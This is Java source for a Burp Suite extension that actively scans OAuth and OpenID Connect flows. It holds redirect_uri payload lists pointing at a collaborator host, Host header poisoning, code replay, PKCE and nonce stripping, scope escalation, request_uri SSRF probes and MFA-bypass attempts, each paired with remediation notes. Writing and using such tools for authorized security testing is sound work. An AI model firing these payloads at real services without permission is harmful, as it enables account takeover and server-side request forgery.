// Created with the help of an AI Agent and littlespidy.
package com.littlespidy.ssoinspector.engine;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.Http;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import com.littlespidy.ssoinspector.model.*;

import java.net.URI;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.function.Consumer;

public class OAuthActiveScanEngine {

    public enum AttackType {
        OPEN_REDIRECT("Redirect URI Open Redirect", "Tests for path traversal, host manipulation, and open redirects via redirect_uri."),
        SCOPE_FUZZING("Scope Escalation / Fuzzing", "Tests authorization and token endpoints against privileged administrative scopes."),
        CODE_REPLAY("Authorization Code Replay", "Tests if authorization codes are invalidated after first use or can be replayed."),
        NONCE_TAMPERING("Nonce Reuse & Stripping", "Tests if authorization servers enforce single-use and mandatory nonce validation."),
        RESPONSE_TYPE_COERCION("Response Type Coercion", "Tests response_type=none bypass and forcing authorization code flow to implicit flow."),
        PKCE_DOWNGRADE("PKCE Downgrade & Bypass", "Tests if PKCE protection can be stripped or downgraded to plaintext."),
        WELL_KNOWN_DISCOVERY("Well-Known & WebFinger Discovery", "Probes host for exposed OAuth and OIDC discovery endpoints and WebFinger."),
        REQUEST_URI_SSRF("Request URI SSRF", "Tests for Server-Side Request Forgery via request_uri parameter."),
        ACR_CONFUSION("ACR Values / MFA Bypass", "Tests if authentication context class reference values can be manipulated to bypass MFA.");

        private final String label;
        private final String description;

        AttackType(String label, String description) {
            this.label = label;
            this.description = description;
        }

        public String getLabel() {
            return label;
        }

        public String getDescription() {
            return description;
        }
    }

    private static final List<String> REDIRECT_PAYLOADS = Arrays.asList(
            "/../../../../../notexist",
            "%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fnotexist",
            "/..;/..;/..;/../testOauth",
            "https://{COLLABORATOR}/",
            "@{COLLABORATOR}/",
            "https://{COLLABORATOR}#",
            ":password@{COLLABORATOR}",
            ".{COLLABORATOR}/",
            "&redirect_uri=https://{COLLABORATOR}/",
            "https://127.0.0.1/",
            "http://127.0.0.1/",
            "http://localhost/",
            "HOST_HEADER",
            "/../../../../../notexist&response_mode=fragment"
    );

    private static final List<String> SCOPE_PAYLOADS = Arrays.asList(
            "admin",
            "premium",
            "profile email address phone",
            "write read",
            "private",
            "offline_access",
            "sudo",
            "api",
            "okta.users.manage",
            "content",
            "full"
    );

    private static final List<String> WELL_KNOWN_PATHS = Arrays.asList(
            "/.well-known/openid-configuration",
            "/.well-known/oauth-authorization-server",
            "/.well-known/webfinger",
            "/.well-known/host-meta",
            "/.well-known/oidcdiscovery"
    );

    private static final List<String> ACR_PAYLOADS = Arrays.asList(
            "pwd", "mfa", "otp", "pin", "sms", "sc", "hwk"
    );

    private final MontoyaApi api;

    public OAuthActiveScanEngine(MontoyaApi api) {
        this.api = api;
    }

    public List<SSOAuditIssue> runAttacks(OAuthRequestEntry entry, Set<AttackType> selectedAttacks,
                                          String callbackDomain, Consumer<String> logger) {
        List<SSOAuditIssue> detectedIssues = new ArrayList<>();
        if (entry == null || entry.getOriginalRequestResponse() == null) {
            return detectedIssues;
        }

        HttpRequest baseRequest = entry.getOriginalRequestResponse().request();
        Http http = api.http();

        String collaboratorHost = (callbackDomain != null && !callbackDomain.isBlank())
                ? callbackDomain.trim()
                : CollaboratorHelper.generatePayload(api, "burpcollaborator.net");

        for (AttackType attack : selectedAttacks) {
            if (logger != null) {
                logger.accept("Running attack: " + attack.getLabel() + "...");
            }

            try {
                switch (attack) {
                    case OPEN_REDIRECT -> testOpenRedirect(baseRequest, entry, collaboratorHost, http, detectedIssues, logger);
                    case SCOPE_FUZZING -> testScopeFuzzing(baseRequest, entry, http, detectedIssues, logger);
                    case CODE_REPLAY -> testCodeReplay(baseRequest, entry, http, detectedIssues, logger);
                    case NONCE_TAMPERING -> testNonceTampering(baseRequest, entry, http, detectedIssues, logger);
                    case RESPONSE_TYPE_COERCION -> testResponseTypeCoercion(baseRequest, entry, http, detectedIssues, logger);
                    case PKCE_DOWNGRADE -> testPkceDowngrade(baseRequest, entry, http, detectedIssues, logger);
                    case WELL_KNOWN_DISCOVERY -> testWellKnownDiscovery(baseRequest, http, detectedIssues, logger);
                    case REQUEST_URI_SSRF -> testRequestUriSsrf(baseRequest, entry, collaboratorHost, http, detectedIssues, logger);
                    case ACR_CONFUSION -> testAcrConfusion(baseRequest, entry, http, detectedIssues, logger);
                }
            } catch (Exception ex) {
                if (logger != null) {
                    logger.accept("Error running " + attack.getLabel() + ": " + ex.getMessage());
                }
            }
        }

        if (logger != null) {
            logger.accept("Active scan finished. Detected " + detectedIssues.size() + " issue(s).");
        }
        return detectedIssues;
    }

    private void testOpenRedirect(HttpRequest baseRequest, OAuthRequestEntry entry, String collaboratorHost,
                                  Http http, List<SSOAuditIssue> issues, Consumer<String> logger) {
        String originalRedirectUri = entry.getParamValue("redirect_uri");
        if (originalRedirectUri == null && !baseRequest.url().contains("client_id")) {
            return;
        }

        String baseRedirect = originalRedirectUri != null ? originalRedirectUri : "https://" + baseRequest.httpService().host();

        for (String rawPayload : REDIRECT_PAYLOADS) {
            String payload = rawPayload.replace("{COLLABORATOR}", collaboratorHost);

            if ("HOST_HEADER".equals(payload)) {
                // Host Header Poisoning attack
                HttpRequest poisonedRequest = baseRequest.withHeader("Host", collaboratorHost + "/" + baseRequest.httpService().host());
                HttpRequestResponse rr = http.sendRequest(poisonedRequest);
                if (rr.hasResponse() && isRedirectToHost(rr.response(), collaboratorHost)) {
                    issues.add(new SSOAuditIssue(
                            "OAUTHv2/OpenID Open Redirect via Host Header Poisoning",
                            IssueSeverity.HIGH,
                            IssueConfidence.FIRM,
                            "The authorization server reflected the poisoned Host header into the OAuth redirection flow or login callback.",
                            "Do not rely on the client-supplied Host header to generate redirection URIs. Use a hardcoded, configured base domain.",
                            "PortSwigger OAuth Host Header Exploitation; RFC 6749 Section 10.6",
                            rr,
                            true
                    ));
                    if (logger != null) logger.accept("FOUND: Open Redirect via Host Header!");
                    break;
                }
                continue;
            }

            String testUri;
            if (payload.startsWith("http") || payload.startsWith("//")) {
                testUri = payload;
            } else if (payload.startsWith("&")) {
                testUri = baseRedirect + payload;
            } else {
                testUri = baseRedirect + payload;
            }

            HttpRequest modifiedReq = replaceOrAddParam(baseRequest, "redirect_uri", testUri);
            HttpRequestResponse rr = http.sendRequest(modifiedReq);

            if (rr.hasResponse()) {
                HttpResponse resp = rr.response();
                int status = resp.statusCode();
                String location = resp.headerValue("Location");

                boolean redirected = (status == 301 || status == 302 || status == 303 || status == 307 || status == 308)
                        && location != null && (location.contains(collaboratorHost) || location.contains("notexist") || location.contains("127.0.0.1") || location.contains("localhost"));

                boolean javascriptRedirect = resp.bodyToString() != null
                        && (resp.bodyToString().contains("location.href") || resp.bodyToString().contains("location.replace"))
                        && (resp.bodyToString().contains(collaboratorHost) || resp.bodyToString().contains("notexist"));

                if (redirected || javascriptRedirect) {
                    issues.add(new SSOAuditIssue(
                            "OAUTHv2/OpenID Open Redirect via Redirect_Uri Parameter",
                            IssueSeverity.HIGH,
                            IssueConfidence.CERTAIN,
                            "The authorization server accepted an unvalidated redirect_uri payload: " + testUri +
                                    " and redirected the browser to an attacker-controlled destination.",
                            "Enforce exact string matching against pre-registered redirection URIs. Disallow regex wildcards, path traversals, or unvetted subdomains.",
                            "RFC 6749 Section 3.1.2 & Section 10.6; OAuth 2.0 Security BCP Section 2.1",
                            rr,
                            true
                    ));
                    if (logger != null) logger.accept("FOUND: Open Redirect with payload: " + testUri);
                    break;
                }
            }
        }
    }

    private void testScopeFuzzing(HttpRequest baseRequest, OAuthRequestEntry entry,
                                  Http http, List<SSOAuditIssue> issues, Consumer<String> logger) {
        String originalScope = entry.getParamValue("scope");
        for (String scope : SCOPE_PAYLOADS) {
            String testScope = (originalScope != null && !originalScope.isBlank()) ? originalScope + " " + scope : scope;
            HttpRequest modifiedReq = replaceOrAddParam(baseRequest, "scope", testScope);
            HttpRequestResponse rr = http.sendRequest(modifiedReq);

            if (rr.hasResponse()) {
                int status = rr.response().statusCode();
                String body = rr.response().bodyToString();
                boolean noError = (status == 200 || status == 302) && (body == null || (!body.toLowerCase().contains("invalid_scope") && !body.toLowerCase().contains("unauthorized_client")));

                if (noError && (scope.equals("admin") || scope.equals("sudo") || scope.equals("full"))) {
                    issues.add(new SSOAuditIssue(
                            "OAUTHv2/OpenID Potential Scope Escalation / Acceptance of Privileged Scope: " + scope,
                            IssueSeverity.MEDIUM,
                            IssueConfidence.TENTATIVE,
                            "The authorization server accepted the high-privilege scope '" + scope +
                                    "' without returning an 'invalid_scope' error code.",
                            "Strictly validate requested scopes against the client's pre-approved permission profile. Reject or strip unauthorized scopes.",
                            "RFC 6749 Section 3.3",
                            rr,
                            true
                    ));
                    if (logger != null) logger.accept("Scope '" + scope + "' accepted without error.");
                    break;
                }
            }
        }
    }

    private void testCodeReplay(HttpRequest baseRequest, OAuthRequestEntry entry,
                                Http http, List<SSOAuditIssue> issues, Consumer<String> logger) {
        String code = entry.getParamValue("code");
        if (code == null || code.isBlank()) {
            return;
        }

        HttpRequestResponse replay1 = http.sendRequest(baseRequest);
        HttpRequestResponse replay2 = http.sendRequest(baseRequest);

        if (replay1.hasResponse() && replay2.hasResponse()) {
            int status1 = replay1.response().statusCode();
            int status2 = replay2.response().statusCode();
            String body2 = replay2.response().bodyToString();

            boolean bothSuccess = (status1 == 200 && status2 == 200);
            boolean noErrorOnSecond = body2 != null && !body2.toLowerCase().contains("invalid_grant") && !body2.toLowerCase().contains("error");

            if (bothSuccess && noErrorOnSecond) {
                issues.add(new SSOAuditIssue(
                        "OAUTHv2/OpenID Vulnerable to Authorization Code Replay Attacks",
                        IssueSeverity.HIGH,
                        IssueConfidence.FIRM,
                        "The authorization server accepted an already-used authorization code ('" + code +
                                "') on a replayed token request and re-issued tokens without invalidating the code.",
                        "Enforce strict single-use for authorization codes. Immediately invalidate any authorization code upon its first exchange. If a replayed code is detected, revoke all previously issued tokens per RFC 6749 Section 4.1.2.",
                        "RFC 6749 Section 4.1.2; OAuth 2.0 Security BCP Section 4.4",
                        replay2,
                        true
                ));
                if (logger != null) logger.accept("FOUND: Authorization Code Replay vulnerability!");
            }
        }
    }

    private void testNonceTampering(HttpRequest baseRequest, OAuthRequestEntry entry,
                                    Http http, List<SSOAuditIssue> issues, Consumer<String> logger) {
        String nonce = entry.getParamValue("nonce");
        if (nonce == null || nonce.isBlank()) {
            return;
        }

        // Test stripping nonce
        HttpRequest strippedReq = removeParam(baseRequest, "nonce");
        HttpRequestResponse strippedRr = http.sendRequest(strippedReq);

        if (strippedRr.hasResponse()) {
            int status = strippedRr.response().statusCode();
            String body = strippedRr.response().bodyToString();
            boolean accepted = (status == 200 || status == 302) && (body == null || !body.toLowerCase().contains("error"));

            if (accepted) {
                issues.add(new SSOAuditIssue(
                        "OpenID Flow Nonce Parameter Not Evaluated",
                        IssueSeverity.LOW,
                        IssueConfidence.FIRM,
                        "The OpenID Connect authorization endpoint accepted a request after stripping the 'nonce' parameter, indicating that nonce validation is not strictly enforced.",
                        "Make the 'nonce' parameter mandatory for all OpenID Connect authentication requests and verify its presence in issued ID Tokens.",
                        "OpenID Connect Core 1.0 Section 3.1.2.1",
                        strippedRr,
                        true
                ));
                if (logger != null) logger.accept("FOUND: Nonce parameter not strictly evaluated.");
            }
        }
    }

    private void testResponseTypeCoercion(HttpRequest baseRequest, OAuthRequestEntry entry,
                                          Http http, List<SSOAuditIssue> issues, Consumer<String> logger) {
        String currentRt = entry.getParamValue("response_type");
        if (currentRt == null) return;

        // 1. Test response_type=none
        HttpRequest noneReq = replaceOrAddParam(baseRequest, "response_type", "none");
        HttpRequestResponse noneRr = http.sendRequest(noneReq);
        if (noneRr.hasResponse() && (noneRr.response().statusCode() == 200 || noneRr.response().statusCode() == 302)) {
            String body = noneRr.response().bodyToString();
            if (body != null && !body.toLowerCase().contains("unsupported_response_type") && !body.toLowerCase().contains("error")) {
                issues.add(new SSOAuditIssue(
                        "OpenID Improper Validation of Response Type Value (response_type=none)",
                        IssueSeverity.HIGH,
                        IssueConfidence.FIRM,
                        "The authorization server did not reject response_type=none, potentially allowing bypass of token issuance or coercion into the insecure 'none' algorithm.",
                        "Explicitly whitelist allowed response_type combinations and reject unexpected values with 'unsupported_response_type'.",
                        "OAuth 2.0 Multiple Response Type Encoding Practices Section 3",
                        noneRr,
                        true
                ));
                if (logger != null) logger.accept("FOUND: response_type=none accepted!");
            }
        }

        // 2. Test response_type=token (downgrade to implicit flow)
        if ("code".equalsIgnoreCase(currentRt)) {
            HttpRequest tokenReq = replaceOrAddParam(baseRequest, "response_type", "token");
            HttpRequestResponse tokenRr = http.sendRequest(tokenReq);
            if (tokenRr.hasResponse() && (tokenRr.response().statusCode() == 200 || tokenRr.response().statusCode() == 302)) {
                String loc = tokenRr.response().headerValue("Location");
                if (loc != null && loc.contains("#access_token=")) {
                    issues.add(new SSOAuditIssue(
                            "OAUTHv2 Response Type Coercion to Implicit Flow",
                            IssueSeverity.HIGH,
                            IssueConfidence.CERTAIN,
                            "An Authorization Code client request was successfully coerced into the insecure Implicit Flow by changing response_type=token.",
                            "Disable the Implicit Flow completely on the client registration and reject response_type=token.",
                            "RFC 6749 Section 3.1.1; OAuth 2.0 Security BCP Section 2.1.2",
                            tokenRr,
                            true
                    ));
                    if (logger != null) logger.accept("FOUND: Response type coerced to Implicit Flow!");
                }
            }
        }
    }

    private void testPkceDowngrade(HttpRequest baseRequest, OAuthRequestEntry entry,
                                   Http http, List<SSOAuditIssue> issues, Consumer<String> logger) {
        String challenge = entry.getParamValue("code_challenge");
        if (challenge == null || challenge.isBlank()) return;

        // 1. Test stripping code_challenge
        HttpRequest strippedChallengeReq = removeParam(baseRequest, "code_challenge");
        strippedChallengeReq = removeParam(strippedChallengeReq, "code_challenge_method");
        HttpRequestResponse strippedRr = http.sendRequest(strippedChallengeReq);

        if (strippedRr.hasResponse() && (strippedRr.response().statusCode() == 200 || strippedRr.response().statusCode() == 302)) {
            String body = strippedRr.response().bodyToString();
            if (body != null && !body.toLowerCase().contains("code_challenge") && !body.toLowerCase().contains("error")) {
                issues.add(new SSOAuditIssue(
                        "OAUTHv2/OpenID PKCE Protection Downgraded / Stripped",
                        IssueSeverity.MEDIUM,
                        IssueConfidence.FIRM,
                        "The authorization server accepted an authorization request after stripping the PKCE code_challenge, allowing attackers to bypass PKCE on public clients.",
                        "Enforce PKCE mandatorily for all public clients and reject authorization requests lacking code_challenge.",
                        "RFC 7636 Section 4.4.1",
                        strippedRr,
                        true
                ));
                if (logger != null) logger.accept("FOUND: PKCE parameters can be stripped!");
            }
        }

        // 2. Test downgrading to plain
        HttpRequest plainReq = replaceOrAddParam(baseRequest, "code_challenge_method", "plain");
        HttpRequestResponse plainRr = http.sendRequest(plainReq);
        if (plainRr.hasResponse() && (plainRr.response().statusCode() == 200 || plainRr.response().statusCode() == 302)) {
            String body = plainRr.response().bodyToString();
            if (body != null && !body.toLowerCase().contains("error")) {
                issues.add(new SSOAuditIssue(
                        "OAUTHv2/OpenID PKCE Downgraded to Plaintext",
                        IssueSeverity.MEDIUM,
                        IssueConfidence.FIRM,
                        "The authorization server accepted code_challenge_method=plain, defeating cryptographic hash protection against code interception.",
                        "Disallow code_challenge_method=plain and strictly require S256.",
                        "RFC 7636 Section 4.2",
                        plainRr,
                        true
                ));
                if (logger != null) logger.accept("FOUND: PKCE downgraded to plain!");
            }
        }
    }

    private void testWellKnownDiscovery(HttpRequest baseRequest, Http http,
                                        List<SSOAuditIssue> issues, Consumer<String> logger) {
        String baseHost = baseRequest.httpService().host();
        for (String path : WELL_KNOWN_PATHS) {
            String testUrl = (baseRequest.httpService().secure() ? "https://" : "http://") + baseHost + path;
            try {
                HttpRequest discReq = HttpRequest.httpRequestFromUrl(testUrl);
                HttpRequestResponse rr = http.sendRequest(discReq);
                if (rr.hasResponse() && rr.response().statusCode() == 200) {
                    String body = rr.response().bodyToString();
                    if (body != null && (body.contains("\"issuer\"") || body.contains("\"authorization_endpoint\"") || body.contains("\"links\""))) {
                        issues.add(new SSOAuditIssue(
                                "OAUTHv2/OpenID Configuration Exposed: " + path,
                                IssueSeverity.INFORMATION,
                                IssueConfidence.CERTAIN,
                                "Discovered active OAuth 2.0 / OpenID Connect metadata configuration at: " + testUrl,
                                "Review published endpoints, signing algorithms, and scopes for security hardening.",
                                "RFC 8414; OpenID Connect Discovery 1.0",
                                rr,
                                true
                        ));
                        if (logger != null) logger.accept("Discovered well-known endpoint: " + path);
                    }
                }
            } catch (Exception ignored) {
            }
        }
    }

    private void testRequestUriSsrf(HttpRequest baseRequest, OAuthRequestEntry entry, String collaboratorHost,
                                    Http http, List<SSOAuditIssue> issues, Consumer<String> logger) {
        String ssrfUrl = "https://" + collaboratorHost + "/oauth_ssrf_test";
        HttpRequest ssrfReq = replaceOrAddParam(baseRequest, "request_uri", ssrfUrl);
        HttpRequestResponse rr = http.sendRequest(ssrfReq);

        if (rr.hasResponse()) {
            issues.add(new SSOAuditIssue(
                    "OAUTHv2/OpenID Probed Request_Uri SSRF (Check Collaborator Interactions)",
                    IssueSeverity.INFORMATION,
                    IssueConfidence.TENTATIVE,
                    "Dispatched an out-of-band SSRF probe to " + ssrfUrl +
                            " via request_uri. Check your Burp Collaborator tab or interaction logs for incoming DNS/HTTP connections.",
                    "Enforce strict destination URI whitelisting for request_uri parameters.",
                    "RFC 9101; OpenID Connect Core 1.0 Section 6.2",
                    rr,
                    true
            ));
            if (logger != null) logger.accept("Dispatched request_uri SSRF probe to: " + ssrfUrl);
        }
    }

    private void testAcrConfusion(HttpRequest baseRequest, OAuthRequestEntry entry,
                                  Http http, List<SSOAuditIssue> issues, Consumer<String> logger) {
        String originalAcr = entry.getParamValue("acr_values");
        if (originalAcr == null || originalAcr.isBlank()) return;

        for (String acr : ACR_PAYLOADS) {
            if (originalAcr.contains(acr)) continue;

            HttpRequest acrReq = replaceOrAddParam(baseRequest, "acr_values", acr);
            HttpRequestResponse rr = http.sendRequest(acrReq);

            if (rr.hasResponse() && rr.response().statusCode() != 401 && rr.response().statusCode() != 403) {
                String body = rr.response().bodyToString();
                if (body != null && !body.toLowerCase().contains("error")) {
                    issues.add(new SSOAuditIssue(
                            "OpenID ACR Value Confusion / Potential MFA Bypass",
                            IssueSeverity.MEDIUM,
                            IssueConfidence.TENTATIVE,
                            "The authorization server accepted an altered acr_values payload ('" + acr +
                                    "') instead of the baseline ('" + originalAcr + "') without returning an authorization error.",
                            "Validate requested acr_values and enforce strict step-up authentication when sensitive resources require multi-factor authentication.",
                            "RFC 8176; OpenID Connect Core 1.0 Section 3.1.2.1",
                            rr,
                            true
                    ));
                    if (logger != null) logger.accept("FOUND: Alternative acr_values accepted: " + acr);
                    break;
                }
            }
        }
    }

    private boolean isRedirectToHost(HttpResponse resp, String host) {
        String loc = resp.headerValue("Location");
        return loc != null && loc.contains(host);
    }

    private HttpRequest replaceOrAddParam(HttpRequest req, String name, String value) {
        if (req.hasParameter(HttpParameter.urlParameter(name, ""))) {
            return req.withUpdatedParameters(HttpParameter.urlParameter(name, value));
        } else if (req.hasParameter(HttpParameter.bodyParameter(name, ""))) {
            return req.withUpdatedParameters(HttpParameter.bodyParameter(name, value));
        } else {
            // Append as URL parameter
            return req.withAddedParameters(HttpParameter.urlParameter(name, value));
        }
    }

    private HttpRequest removeParam(HttpRequest req, String name) {
        if (req.hasParameter(HttpParameter.urlParameter(name, ""))) {
            return req.withRemovedParameters(HttpParameter.urlParameter(name, ""));
        } else if (req.hasParameter(HttpParameter.bodyParameter(name, ""))) {
            return req.withRemovedParameters(HttpParameter.bodyParameter(name, ""));
        }
        return req;
    }
}
